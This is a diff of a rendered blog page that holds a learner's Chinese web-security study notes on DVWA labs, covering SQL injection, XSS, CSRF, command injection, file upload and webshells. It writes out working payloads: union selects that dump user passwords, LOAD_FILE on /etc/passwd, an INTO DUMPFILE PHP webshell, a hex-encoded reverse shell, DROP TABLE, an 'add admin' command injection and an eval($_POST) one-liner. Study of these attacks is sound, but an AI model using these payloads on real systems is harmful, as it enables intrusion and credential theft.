@@ -78,35 +78,33 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/SQL-注入/" data-id="cjtgrssan0000hwukxp7r0fsr" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/SQL-注入/" data-id="cjth476hj00006wuk7e6r8f7i" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
-        <p>###手动漏洞挖掘-sql注入<br>服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器</p>
+        <h3 id="手动漏洞挖掘-sql注入"><a href="#手动漏洞挖掘-sql注入" class="headerlink" title="手动漏洞挖掘-sql注入"></a>手动漏洞挖掘-sql注入</h3><p>服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器</p>
 <hr>
-<p>####用户登录判断<br>·SELECT<em>FROM users WHERE user= ‘uname ‘ AND password=’pass’<br>·SELECT</em>FROM users WHERE user=’name’ AND password=’’ OR ‘’=’’<br>·基于报错的检测方法<br>·  ‘  % （）<br>·基于布尔的检测方法<br>1 ‘ and  ‘1 ‘= ‘1       /       1 ‘ and  ‘1<br>1 ‘and ‘1 ‘= ‘2         /        1 ‘and ‘0<br>判断查询字段并搞清楚位置表列数<br> ‘order by 9–                   #按查询列号排序<br>·  select + 时刻字段数=查询字段数<br>· 联合查询（多条查询语句同时执行）<br>·  ‘union select 1.2–<br>· ·union all select database().2–<br>DB用户 ： user（）<br>DB版本 ;   version()<br>‘union select databnase() , substring_index(user(),”@”,1)#（把查询函数切分）<br>全局函数 ： @@datadir（当前数据库所在位置），@@hostname（主机名）,@@VERSION，@@VERSION_compile_os （操作系统版本）<br>当前库： database()<br>·ASCLL转字符：char()                  分隔<br>链接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())<br>计算哈希：md5()</p>
+<h4 id="用户登录判断"><a href="#用户登录判断" class="headerlink" title="用户登录判断"></a>用户登录判断</h4><p>·SELECT<em>FROM users WHERE user= ‘uname ‘ AND password=’pass’<br>·SELECT</em>FROM users WHERE user=’name’ AND password=’’ OR ‘’=’’<br>·基于报错的检测方法<br>·  ‘  % （）<br>·基于布尔的检测方法<br>1 ‘ and  ‘1 ‘= ‘1       /       1 ‘ and  ‘1<br>1 ‘and ‘1 ‘= ‘2         /        1 ‘and ‘0<br>判断查询字段并搞清楚位置表列数<br> ‘order by 9–                   #按查询列号排序<br>·  select + 时刻字段数=查询字段数<br>· 联合查询（多条查询语句同时执行）<br>·  ‘union select 1.2–<br>· ·union all select database().2–<br>DB用户 ： user（）<br>DB版本 ;   version()<br>‘union select databnase() , substring_index(user(),”@”,1)#（把查询函数切分）<br>全局函数 ： @@datadir（当前数据库所在位置），@@hostname（主机名）,@@VERSION，@@VERSION_compile_os （操作系统版本）<br>当前库： database()<br>·ASCLL转字符：char()                  分隔<br>链接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())<br>计算哈希：md5()</p>
 <hr>
-<p>####Mysql 数据结构<br>·information_schema<br>·所有库所有表/统计每库中表的数量<br>union select table_name,table_schema,from information_schema.tables#（查所有表）<br>UNION select table schema.count() FROM information_Schema.tables group by table_schema#（查表名）</p>
+<h4 id="Mysql-数据结构"><a href="#Mysql-数据结构" class="headerlink" title="Mysql 数据结构"></a>Mysql 数据结构</h4><p>·information_schema<br>·所有库所有表/统计每库中表的数量<br>union select table_name,table_schema,from information_schema.tables#（查所有表）<br>UNION select table schema.count() FROM information_Schema.tables group by table_schema#（查表名）</p>
 <hr>
-<p>####Dvwa库中的表名<br>·union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’#(按表名查询)</p>
+<h4 id="Dvwa库中的表名"><a href="#Dvwa库中的表名" class="headerlink" title="Dvwa库中的表名"></a>Dvwa库中的表名</h4><p>·union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’#(按表名查询)</p>
 <hr>
-<p>####查询user,password 列的内容<br>·union select user,password from dvwa.users#<br>·union select user,password from users#<br>·union select null,CONCAT(user(),0x3a,password) from users#</p>
+<h4 id="查询user-password-列的内容"><a href="#查询user-password-列的内容" class="headerlink" title="查询user,password 列的内容"></a>查询user,password 列的内容</h4><p>·union select user,password from dvwa.users#<br>·union select user,password from users#<br>·union select null,CONCAT(user(),0x3a,password) from users#</p>
 <hr>
-<p>####破解MD5<br>username:passhas——–&gt;hashtest<br>john –format=raw-MD5 hashtest –shou<br>sqlmap -d “mysql://root:@192.168.177.129:3306/dvwa” -a</p>
+<h4 id="破解MD5"><a href="#破解MD5" class="headerlink" title="破解MD5"></a>破解MD5</h4><p>username:passhas——–&gt;hashtest<br>john –format=raw-MD5 hashtest –shou<br>sqlmap -d “mysql://root:@192.168.177.129:3306/dvwa” -a</p>
 <hr>
-<p>###读写文件和下载数据库</p>
-<p>####读取文件<br>‘union select null,LOAD_file(‘/etc/passwd’)#</p>
+<h3 id="读写文件和下载数据库"><a href="#读写文件和下载数据库" class="headerlink" title="读写文件和下载数据库"></a>读写文件和下载数据库</h3><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>‘union select null,LOAD_file(‘/etc/passwd’)#</p>
 <hr>
-<p>####写入文件</p>
-<blockquote>
+<h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><blockquote>
 <p>‘union select null,”&lt;?php passthtu  $_GET[‘cmd’]);?&gt;”INTO DUMPFILE”/var/www/a.php”<br>可能会出发过滤机制<br>用16进制编码<br>kali实操拷贝一个反弹shell<br>cp /usr/share/webshell/php/ –&gt;reverse-shell.php/b.php<br>vi b.php 把ip改成目标ip 对b.php编码<br>cat b.php | xxd &lt;–(16进制编码) -ps<br>（会以固定长度编译，换行符mysql无法理解）用| tr -d ‘\n’<br>复制下编码内容注入到语句中去（0x编码内容）</p>
 </blockquote>
 <pre><code>·Mysql账号
 </code></pre><p>cat php-revers-shell.php|xxd -ps | tr -d ‘\n’(反弹shell)</p>
-<p>####保存下载数据库<br>union select null,(0x3a,password) from users INTO OUTFILE’/tmp/a.db’#(脱库到目标服务器的本地目录，在通过url下载)</p>
-<p>####一个思路：编写服务器代码<br>举个例子：<br><img src="https://s2.ax1x.com/2019/03/19/AuGOAS.png" alt><br>（上传的webshell收到限制没什么用）<br>变换一个思路了解目标服务器结构等等，直接写一段代码执行命令<br>如上图可以创建一个表单添加一个用户<br>现在的加密破解难度极大，效率低，可以变通思路，直接更改数据库内容，或添加高权限管理员</p>
+<h4 id="保存下载数据库"><a href="#保存下载数据库" class="headerlink" title="保存下载数据库"></a>保存下载数据库</h4><p>union select null,(0x3a,password) from users INTO OUTFILE’/tmp/a.db’#(脱库到目标服务器的本地目录，在通过url下载)</p>
+<h4 id="一个思路：编写服务器代码"><a href="#一个思路：编写服务器代码" class="headerlink" title="一个思路：编写服务器代码"></a>一个思路：编写服务器代码</h4><p>举个例子：<br><img src="https://s2.ax1x.com/2019/03/19/AuGOAS.png" alt><br>（上传的webshell收到限制没什么用）<br>变换一个思路了解目标服务器结构等等，直接写一段代码执行命令<br>如上图可以创建一个表单添加一个用户<br>现在的加密破解难度极大，效率低，可以变通思路，直接更改数据库内容，或添加高权限管理员</p>
 <blockquote>
 <p>ps 建议在kali装上professional的burp suite</p>
 </blockquote>
@@ -123,12 +121,11 @@
 <blockquote>
 <p>· ‘:updat user set user=’yuanfh’ where user=’admin<br>“;”可以并列多条数据库语句<br>· INSERT INTO users（’user_id’,’first name’,’last_name’,’）user’,’password’,’avatar)VALUES(‘35’,’fh’,’yuan’,’密码’,’OK’);#<br>‘;DROP TABLE users；#<br>xp_cmdshell/ 储存过程<br>·SQLi没有通用的方法，要领就是掌握原理，了解各种数据库特性</p>
 </blockquote>
-<p>#####sql注入-DVWAmedium难度级别和high难度区分<br><img src="https://s2.ax1x.com/2019/03/20/AKngEj.png" alt><img src="https://s2.ax1x.com/2019/03/20/AKna4I.png" alt><br>上面两张图就是medium和low的区别<br>mysql_real_escape_string()”在php5.5弃用”在php7.0删除此语句，代之以MysqlLi，PDO_MySQl<br>medium在low的基础上增加了一句过滤语句，是PHP的集成语句，能实现特殊字符的转译</p>
+<h5 id="sql注入-DVWAmedium难度级别和high难度区分"><a href="#sql注入-DVWAmedium难度级别和high难度区分" class="headerlink" title="sql注入-DVWAmedium难度级别和high难度区分"></a>sql注入-DVWAmedium难度级别和high难度区分</h5><p><img src="https://s2.ax1x.com/2019/03/20/AKngEj.png" alt><img src="https://s2.ax1x.com/2019/03/20/AKna4I.png" alt><br>上面两张图就是medium和low的区别<br>mysql_real_escape_string()”在php5.5弃用”在php7.0删除此语句，代之以MysqlLi，PDO_MySQl<br>medium在low的基础上增加了一句过滤语句，是PHP的集成语句，能实现特殊字符的转译</p>
 <blockquote>
 <p>“\,’,”,\n,\r,\xla”<br>下面看一下high改动的代码<br><img src="https://s2.ax1x.com/2019/03/20/AKuJzV.png" alt="在添加一行删除\的代码"><br><img src="https://s2.ax1x.com/2019/03/20/AKuDiR.png" alt="检查输入的是否为数字拒绝其他输入"><br>一个数字检查就无法注入select语句了</p>
 </blockquote>
-<p>###sql 盲注</p>
-
+<h3 id="sql-盲注"><a href="#sql-盲注" class="headerlink" title="sql 盲注"></a>sql 盲注</h3>
       
     </div><!-- .entry-content -->
 
@@ -164,14 +161,13 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/web安全入门第五天/" data-id="cjtgrssb20004hwukcd1a8wsw" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/web安全入门第五天/" data-id="cjth476ix00066wukbagsfavm" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
-        <p>###综合场景渗透与渗透测试流程</p>
-<blockquote>
+        <h3 id="综合场景渗透与渗透测试流程"><a href="#综合场景渗透与渗透测试流程" class="headerlink" title="综合场景渗透与渗透测试流程"></a>综合场景渗透与渗透测试流程</h3><blockquote>
 <p>入门篇的渗透工具和渗透方式大概就介绍完了，今天介绍一下综合的流程思路什么的后面应该就会开展专题的渗透学习了<br>还是说一下什么是渗透测试：“从攻击者的角度审核网络系统安全过程 使用黑客手段发现系统漏洞帮助系统管理员知道面临的威胁，以便采取必要的防范措施”<br>目的是为了发现漏洞，数据泄漏获取权限以及更深入的目标，学安全学的第一句话就是(人品第一，技术第二)就不要想着去干坏事啊。</p>
 <ol>
 <li>发现漏洞： 手工测试 漏洞扫描</li>
@@ -253,33 +249,32 @@ mysql udf提权
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/web安全入门第4天/" data-id="cjtgrssau0001hwukqg9xlcym" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/web安全入门第4天/" data-id="cjth476ht00026wukzrtxzhi5" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
-        <p>####很常见的漏洞xss漏洞（跨站脚本攻击）<br>由于浏览器工作机制差不多：解析渲染web中间件响应的html语言等所以xss使用范围极广<br>服务器与网站建立的联系是一次性的，为了让浏览器再次访问是能被服务器‘认出来’，服务器就会给浏览器发一个cookie(本地保存的密码实际上就是保存cookie)作为辨认标识，也是识别身份的唯一凭证可以通过在地址栏输入javascript:(document.cookie)查询。<br>危害很大<br>·窃取cookie  ·DDoS攻击  ·网页挂马  ·提升用户权限 ·获取客户端信息 ·传播跨站脚本蠕虫  ·劫持用户会话·强制弹出广告页面 ·任意窜改页面信息<br>xss攻击一般分为三种</p>
+        <h4 id="很常见的漏洞xss漏洞（跨站脚本攻击）"><a href="#很常见的漏洞xss漏洞（跨站脚本攻击）" class="headerlink" title="很常见的漏洞xss漏洞（跨站脚本攻击）"></a>很常见的漏洞xss漏洞（跨站脚本攻击）</h4><p>由于浏览器工作机制差不多：解析渲染web中间件响应的html语言等所以xss使用范围极广<br>服务器与网站建立的联系是一次性的，为了让浏览器再次访问是能被服务器‘认出来’，服务器就会给浏览器发一个cookie(本地保存的密码实际上就是保存cookie)作为辨认标识，也是识别身份的唯一凭证可以通过在地址栏输入javascript:(document.cookie)查询。<br>危害很大<br>·窃取cookie  ·DDoS攻击  ·网页挂马  ·提升用户权限 ·获取客户端信息 ·传播跨站脚本蠕虫  ·劫持用户会话·强制弹出广告页面 ·任意窜改页面信息<br>xss攻击一般分为三种</p>
 <ol>
 <li>反射型xss 一次性攻击 </li>
 <li>存储型xss  如果服务器打开新的网的时候调用了含有恶意js脚本的网站所有访问的浏览器都会执行</li>
 <li>DOM型特殊类型的反射型xss，但不需要和服务器进行交互</li>
 </ol>
-<p>####xss漏洞发现和利用<br>反射性xss可以在源码查看关键变量<br>eg：</p>
+<h4 id="xss漏洞发现和利用"><a href="#xss漏洞发现和利用" class="headerlink" title="xss漏洞发现和利用"></a>xss漏洞发现和利用</h4><p>反射性xss可以在源码查看关键变量<br>eg：</p>
 <blockquote>
 <p><scricpt>alart(“我的人生没有故事只有一个帅字贯穿始终”)<br>或者<br>&lt;img src=0 onerrow alart(‘xss’)&gt;<br>提交则会弹窗<br>储存型xss和反射型差不多不过会长期保存<br>Dom不太明白就不多说了</scricpt></p>
 </blockquote>
 <hr>
-<p>####xss自动化测试<br>常见  ·awvs   ·appscan   ·w3af    ·xsser   ·xssf<br>如果发现了xss漏洞，那么我们可以结合一些xss工具来利用。常见的css利用工具有下面几个<br>·BlueLotus——XSSReceiver搭建的XSS平台<br>·XSSer.me源代码搭建的XSS平台<br>·kali下的BeEf</p>
-<p>####CSrf（跨站请求伪造）<br>！<a href="https://s2.ax1x.com/2019/03/19/AuExN6.png" target="_blank" rel="noopener"></a><br>csrf 常与xss混合使用<br>原理：web应用程序在用户进行敏感操作时，如修改账号密码，添加账号，转账等，没有校验表单token或者http请求头中的referer值，被恶意利用完成恶意请求</p>
+<h4 id="xss自动化测试"><a href="#xss自动化测试" class="headerlink" title="xss自动化测试"></a>xss自动化测试</h4><p>常见  ·awvs   ·appscan   ·w3af    ·xsser   ·xssf<br>如果发现了xss漏洞，那么我们可以结合一些xss工具来利用。常见的css利用工具有下面几个<br>·BlueLotus——XSSReceiver搭建的XSS平台<br>·XSSer.me源代码搭建的XSS平台<br>·kali下的BeEf</p>
+<h4 id="CSrf（跨站请求伪造）"><a href="#CSrf（跨站请求伪造）" class="headerlink" title="CSrf（跨站请求伪造）"></a>CSrf（跨站请求伪造）</h4><p>！<a href="https://s2.ax1x.com/2019/03/19/AuExN6.png" target="_blank" rel="noopener"></a><br>csrf 常与xss混合使用<br>原理：web应用程序在用户进行敏感操作时，如修改账号密码，添加账号，转账等，没有校验表单token或者http请求头中的referer值，被恶意利用完成恶意请求</p>
 <hr>
-<p>####目录遍历漏洞<br>目录遍历漏洞是应为Web中间件与网站目录权限配置不当。在网站目录无索引文件（index.html,index.asp,index.php,index.jsp）的情况下访问改网站会直接显示该目录下所有文件及其子目录。通过web中间件进行正确的配置，可以由效避免这些漏洞。<br>可以手工测试，也可以用自动化扫描器（awvs，w3af，APPscan）<br>可以得到很多信息</p>
-<p>####信息泄露漏洞，任意文件读取漏洞（简单介绍一下）</p>
-<p>#####信息泄露<br>web服务器敏感信息泄露端口 ：服务类型 开放服务版本。<br>中间件敏感信息泄露 ：中间件类型 版本 后台地址。<br>web应用程序信息泄露。<br>web应用程序脚本程序版本。<br>web应用程序开发框架。<br>web应用程序cms类型。<br>web应用程序后台地址 敏感目录 api等。<br>安装目录信息。<br>开发遗留文件。<br>第三方插件。<br>的whois信息。</p>
+<h4 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h4><p>目录遍历漏洞是应为Web中间件与网站目录权限配置不当。在网站目录无索引文件（index.html,index.asp,index.php,index.jsp）的情况下访问改网站会直接显示该目录下所有文件及其子目录。通过web中间件进行正确的配置，可以由效避免这些漏洞。<br>可以手工测试，也可以用自动化扫描器（awvs，w3af，APPscan）<br>可以得到很多信息</p>
+<h4 id="信息泄露漏洞，任意文件读取漏洞（简单介绍一下）"><a href="#信息泄露漏洞，任意文件读取漏洞（简单介绍一下）" class="headerlink" title="信息泄露漏洞，任意文件读取漏洞（简单介绍一下）"></a>信息泄露漏洞，任意文件读取漏洞（简单介绍一下）</h4><h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5><p>web服务器敏感信息泄露端口 ：服务类型 开放服务版本。<br>中间件敏感信息泄露 ：中间件类型 版本 后台地址。<br>web应用程序信息泄露。<br>web应用程序脚本程序版本。<br>web应用程序开发框架。<br>web应用程序cms类型。<br>web应用程序后台地址 敏感目录 api等。<br>安装目录信息。<br>开发遗留文件。<br>第三方插件。<br>的whois信息。</p>
 <blockquote>
 <p>防御方式：修改默认端口   屏蔽安装的服务的版本信息，修改对web中间件默认的后台地址</p>
 </blockquote>
-<p>#####任意文件读取<br>配置不当且没有对用户下载的文件参数进行有效的过滤，恶意用户就可以获取任意文件如web数据库的账号密码等。<br>如果网站提供的链接形如：<br>·readfile.php?file=<strong> </strong> .txt<br>·download.php?file=<strong> </strong> .rar<br>或者参数名为：<br>·realPath=<br>·filePath=<br>·inputfile=<br>则多半是可利用的目录遍历漏洞<br>尝试下载网站的索引文件index文件，下载文件本身，下载爬虫都可以利用。</p>
+<h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><p>配置不当且没有对用户下载的文件参数进行有效的过滤，恶意用户就可以获取任意文件如web数据库的账号密码等。<br>如果网站提供的链接形如：<br>·readfile.php?file=<strong> </strong> .txt<br>·download.php?file=<strong> </strong> .rar<br>或者参数名为：<br>·realPath=<br>·filePath=<br>·inputfile=<br>则多半是可利用的目录遍历漏洞<br>尝试下载网站的索引文件index文件，下载文件本身，下载爬虫都可以利用。</p>
 <hr>
 
       
@@ -317,19 +312,18 @@ mysql udf提权
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/web安全入门第三天/" data-id="cjtgrssax0003hwuk1whqn2wu" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/web安全入门第三天/" data-id="cjth476hw00046wukkn9wnkt5" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
-        <p>###简单的sql注入<br>原理都和其他渗透方式差不多，都是未将用户提供的参数和查询代码隔离。<br>常见几种注入方式：<br>整形注入；字符型注入；基于错误显示的sql注入；union型sql注入；布尔型注入；基于时间的sql注入<br>web后端数据库一般有Mysql，SQLServer，Oracle，Access，</p>
-<p>######因为没有细致的展开去学，这里也不过多介绍，后面学了会补上博客连接</p>
-<p>####注入的基本思路：<br>·判断是否为动态网站，注入点仅存于动态网站；<br>·判断是否有注入点<br>·手工或者通过工具查看数据库信息<br>·获取敏感信息，密码等</p>
+        <h3 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h3><p>原理都和其他渗透方式差不多，都是未将用户提供的参数和查询代码隔离。<br>常见几种注入方式：<br>整形注入；字符型注入；基于错误显示的sql注入；union型sql注入；布尔型注入；基于时间的sql注入<br>web后端数据库一般有Mysql，SQLServer，Oracle，Access，</p>
+<h6 id="因为没有细致的展开去学，这里也不过多介绍，后面学了会补上博客连接"><a href="#因为没有细致的展开去学，这里也不过多介绍，后面学了会补上博客连接" class="headerlink" title="因为没有细致的展开去学，这里也不过多介绍，后面学了会补上博客连接"></a>因为没有细致的展开去学，这里也不过多介绍，后面学了会补上博客连接</h6><h4 id="注入的基本思路："><a href="#注入的基本思路：" class="headerlink" title="注入的基本思路："></a>注入的基本思路：</h4><p>·判断是否为动态网站，注入点仅存于动态网站；<br>·判断是否有注入点<br>·手工或者通过工具查看数据库信息<br>·获取敏感信息，密码等</p>
 <hr>
-<p>####常见手工注入语句：<br>‘ and ’1‘=’1        ；‘ and ’1‘=’2<br>查询列数的语句： order by n （超出列数会执行错误）<br>union(联合查询可以和多条select语句共同起作用)<br>判断数据显示点 union select 1，2，3，N<br>查看数据库基本信息<br>version（），database（）<br>查看数据库有哪些表<br>union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’<br>查看对应表有那些列<br>union select 1,2,group_contacat(column_name)from information_schema.clumns where table_name= ‘users’<br>查看账号密码信息<br>union select 1,group_concat(username),group_concat(password) from users<br>最常用的工具就是SQL map了，上手也快功能强大<br><img src="https://s2.ax1x.com/2019/03/19/AnWmEF.png" alt><br><a href="https://www.baidu.com" target="_blank" rel="noopener">进阶版</a></p>
+<h4 id="常见手工注入语句："><a href="#常见手工注入语句：" class="headerlink" title="常见手工注入语句："></a>常见手工注入语句：</h4><p>‘ and ’1‘=’1        ；‘ and ’1‘=’2<br>查询列数的语句： order by n （超出列数会执行错误）<br>union(联合查询可以和多条select语句共同起作用)<br>判断数据显示点 union select 1，2，3，N<br>查看数据库基本信息<br>version（），database（）<br>查看数据库有哪些表<br>union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’<br>查看对应表有那些列<br>union select 1,2,group_contacat(column_name)from information_schema.clumns where table_name= ‘users’<br>查看账号密码信息<br>union select 1,group_concat(username),group_concat(password) from users<br>最常用的工具就是SQL map了，上手也快功能强大<br><img src="https://s2.ax1x.com/2019/03/19/AnWmEF.png" alt><br><a href="https://www.baidu.com" target="_blank" rel="noopener">进阶版</a></p>
 <hr>
-<p>###命令注入漏洞<br>有些网站可以提ping功能，但是如果缺少一些过滤保护，那么就能通过一些特殊的指令让其执行恶意命令<br>命令的权限取决于web中间件的权限<br>举个简单的例子 ping 127.0.0.1 &amp;&amp; net user admin password /add<br>就可以通过命令添加一个新的admin管理员<br>常见下面的命令：</p>
+<h3 id="命令注入漏洞"><a href="#命令注入漏洞" class="headerlink" title="命令注入漏洞"></a>命令注入漏洞</h3><p>有些网站可以提ping功能，但是如果缺少一些过滤保护，那么就能通过一些特殊的指令让其执行恶意命令<br>命令的权限取决于web中间件的权限<br>举个简单的例子 ping 127.0.0.1 &amp;&amp; net user admin password /add<br>就可以通过命令添加一个新的admin管理员<br>常见下面的命令：</p>
 <hr>
 <table>
 <thead>
@@ -459,21 +453,21 @@ mysql udf提权
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/18/web安全入门第二天/" data-id="cjtgrssb30005hwuka0beblcb" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/18/web安全入门第二天/" data-id="cjth476hx00056wuk93qkb1jv" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
-        <p>###web威胁概述<br><a href="http://www.owasp.org.cn/owasp-project/OWASPTop102017RC2.pdf" target="_blank" rel="noopener">OWASP top-ten</a>： open web application security project开放式web应用程序安全项目</p>
+        <h3 id="web威胁概述"><a href="#web威胁概述" class="headerlink" title="web威胁概述"></a>web威胁概述</h3><p><a href="http://www.owasp.org.cn/owasp-project/OWASPTop102017RC2.pdf" target="_blank" rel="noopener">OWASP top-ten</a>： open web application security project开放式web应用程序安全项目</p>
 <hr>
 <p>####Webshell(就是木马后门（php，jsp等）)<br> 一句话木马：代码简单，通过webshell工具可以实现强大的功能<br>php： eval 函数<br>前一天有讲到http的get 和post 的请求方式这里$_POST   php超全局变量$_GET和$_POST<br>用于收集表单数据（from-data）<br>eg：eval ($_POST[‘cmd’]);<br>其他webshell 大马不需要菜刀等工具本身有各种类型的集成代码</p>
 <hr>
-<p>###文件上传漏洞<br>直接上传webshell控制服务器<br>原理 未将web应用程序与用户提交文件隔离<br>上传流程：前端校验      http传输    web应用程序校验    web应用储存   web应用解析运行<br><img src="https://s2.ax1x.com/2019/03/18/AnFvdK.md.png" alt><br>任意文件上传漏洞：<br>开发人员测试代码没删除，上传文件经过压缩编码 ，通过特定的客户端上传，如app<br>逃过js校验上传<br>绕过方法 ：修改前端JS代码 、改包<br>后i段上传校验绕过一般校验字段<br><img src="https://s2.ax1x.com/2019/03/18/AnFjZ6.md.png" alt><br>绕过扩展名的校验绕过黑名单<br>PHP php5,php6,php加空格，phtml，PhP（大小写混合）<br>ASP：aspx，cer，cdx，aSp（大小写混合）<br>JSp：jspx,jspfJsP(大小写混合)</p>
+<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>直接上传webshell控制服务器<br>原理 未将web应用程序与用户提交文件隔离<br>上传流程：前端校验      http传输    web应用程序校验    web应用储存   web应用解析运行<br><img src="https://s2.ax1x.com/2019/03/18/AnFvdK.md.png" alt><br>任意文件上传漏洞：<br>开发人员测试代码没删除，上传文件经过压缩编码 ，通过特定的客户端上传，如app<br>逃过js校验上传<br>绕过方法 ：修改前端JS代码 、改包<br>后i段上传校验绕过一般校验字段<br><img src="https://s2.ax1x.com/2019/03/18/AnFjZ6.md.png" alt><br>绕过扩展名的校验绕过黑名单<br>PHP php5,php6,php加空格，phtml，PhP（大小写混合）<br>ASP：aspx，cer，cdx，aSp（大小写混合）<br>JSp：jspx,jspfJsP(大小写混合)</p>
 <hr>
-<p>####绕过头文件校验<br><img src="https://s2.ax1x.com/2019/03/18/AnFOqx.md.png" alt><br>文件上传漏洞00截断<br>在上传文件时web在某些版本下遇到\x00字符后会截断路径名，测试人员通过构造韩、x00的特殊文件名就可以通过上传文件名的扩展名校验，但在保存时却以非法扩展名保存文件<br>例如test.php\x00.jpg<br><img src="https://s2.ax1x.com/2019/03/18/AnFLs1.png" alt></p>
+<h4 id="绕过头文件校验"><a href="#绕过头文件校验" class="headerlink" title="绕过头文件校验"></a>绕过头文件校验</h4><p><img src="https://s2.ax1x.com/2019/03/18/AnFOqx.md.png" alt><br>文件上传漏洞00截断<br>在上传文件时web在某些版本下遇到\x00字符后会截断路径名，测试人员通过构造韩、x00的特殊文件名就可以通过上传文件名的扩展名校验，但在保存时却以非法扩展名保存文件<br>例如test.php\x00.jpg<br><img src="https://s2.ax1x.com/2019/03/18/AnFLs1.png" alt></p>
 <hr>
-<p>####解析漏洞<br><img src="https://s2.ax1x.com/2019/03/18/AnFqMR.md.png" alt></p>
+<h4 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h4><p><img src="https://s2.ax1x.com/2019/03/18/AnFqMR.md.png" alt></p>
 
       
     </div><!-- .entry-content -->
@@ -510,21 +504,20 @@ mysql udf提权
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/18/web安全入门第一天/" data-id="cjtgrssav0002hwukpfysqhch" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/18/web安全入门第一天/" data-id="cjth476hu00036wuk1vmrme82" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
         <p>在学习这些东西之前，就只学过学校教的c语言吧，看过几天python算是从0开开始学习安全这一块了这篇博客大概就是从i春秋和安全牛客上看视频学习的一些学习记录。</p>
-<p>###web入门第一天</p>
-<p>####HTTP之请求方法请求： GET HEAD POST<br>HTTP之响应消息Response;<br>一般情况有4部分<br>1.状态行 2消息报头3.空行 4.响应正文<br>提交请求后会收到返还的状态码：<br>1xx:指示信息–请求已接收，继续处理   ；<br>2xx:成功–接收、理解、接受 ；<br>3xx：重定向–要完成请求必须更进一步操作；<br>4xx:客户端错误–请求有语法错误or无法实现请求；<br>5xx：服务器错误–服务器未能实现合法请求。</p>
+<h3 id="web入门第一天"><a href="#web入门第一天" class="headerlink" title="web入门第一天"></a>web入门第一天</h3><h4 id="HTTP之请求方法请求：-GET-HEAD-POST"><a href="#HTTP之请求方法请求：-GET-HEAD-POST" class="headerlink" title="HTTP之请求方法请求： GET HEAD POST"></a>HTTP之请求方法请求： GET HEAD POST</h4><p>HTTP之响应消息Response;<br>一般情况有4部分<br>1.状态行 2消息报头3.空行 4.响应正文<br>提交请求后会收到返还的状态码：<br>1xx:指示信息–请求已接收，继续处理   ；<br>2xx:成功–接收、理解、接受 ；<br>3xx：重定向–要完成请求必须更进一步操作；<br>4xx:客户端错误–请求有语法错误or无法实现请求；<br>5xx：服务器错误–服务器未能实现合法请求。</p>
 <hr>
